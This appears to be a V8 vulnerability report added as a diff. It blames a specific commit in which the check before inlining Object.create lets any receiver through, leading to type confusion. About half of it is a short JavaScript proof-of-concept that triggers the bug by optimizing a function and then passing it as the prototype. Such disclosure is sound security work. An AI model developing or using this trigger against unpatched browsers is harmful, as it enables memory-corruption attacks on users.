@@ -1,0 +1,31 @@
+/*
+I think this commit has introduced the bug.
+https://chromium.googlesource.com/v8/v8/+/ff7063c7d5d8ad8eafcce3da59e65d7fe2b4f915%5E%21/#F2
+
+According to the description, Object.create is supposed to be inlined only when the prototype given as the parameter is "null".
+
+The following check has to guarantee it, but it can't guarantee it. Any receiver can get through the check, then Map::GetObjectCreateMap may transition the prototype, which may lead to type confusion.
+  if (!prototype_const->IsNull(isolate()) && !prototype_const->IsJSReceiver()) {
+    return NoChange();
+  }
+  instance_map = Map::GetObjectCreateMap(prototype_const);
+
+PoC:
+*/
+
+var object;
+function opt() {
+    opt['x'] = 1.1;
+    try {
+        Object.create(object);
+    } catch (e) {
+    }
+
+    for (let i = 0; i < 1000000; i++) {
+
+    }
+}
+
+opt();
+object = opt;
+opt();
